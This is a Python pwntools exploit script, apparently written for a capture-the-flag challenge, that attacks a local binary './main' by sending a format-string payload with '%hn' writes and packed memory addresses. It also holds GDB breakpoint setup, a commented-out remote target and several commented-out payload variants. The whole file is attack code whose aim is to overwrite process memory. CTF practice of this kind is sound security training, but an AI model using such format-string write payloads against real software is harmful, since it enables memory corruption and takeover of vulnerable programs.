from pwn import *

pwnable = './main'

elf = ELF(pwnable)
#libc = ELF('./libc6_2.27-3ubuntu1_amd64.so')
#libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')

context(terminal=['tmux', 'new-window'])
context(os = 'linux', arch = 'amd64')

context.log_level = 'DEBUG'

#setarch $(uname -m) -R /bin/bash
debug_set = ''

debug_set_1 = '''
    b *0x555555554b2b
    b *0x555555554b30
    b *0x555555554b50
    b *0x7ffff77fa932
    b *0x555555554bf7
    '''

if len(sys.argv) > 2 and sys.argv[1] == 'debug':
    p = process(pwnable)
    gdb.attach(p, debug_set_1)
elif len(sys.argv) > 1 and sys.argv[1] == 'debug':
    #p = process("./seethefile", env=env)
    #gdb.attach(p, debug_set_1)
    p = process(pwnable)
    gdb.attach(p, debug_set_1)
else:
    #p = process('./seethefile')
    #env = {"LD_PRELOAD": os.path.join(os.getcwd(), "/root/libc_32.so.6")}
    p = process(pwnable, aslr=True)
    #p = remote('challs.xmas.htsp.ro', 12002)



p.recvuntil("?\n")
#0x7ffff7fea740

#p.sendline("%22x%222x%33x%hn" + p64(0x00007ffff7ffe710))
p.sendline("%22x%222x%33x%hn" + p64(0x7ffff7fea740) + p64(0x7ffff7fea740))
#p.sendline("%22x%222x%33x%hn" + p64(0x00007ffff7ffe710))
#p.sendline("%2044x %p %p %hn %p %p %p %p")
p.recvuntil("Santa")
payload = "end of letter"
p.sendline(payload)
p.recvline()
p.recvline()
p.recvuntil(payload)
p.wait_for_close()

#p.interactive()
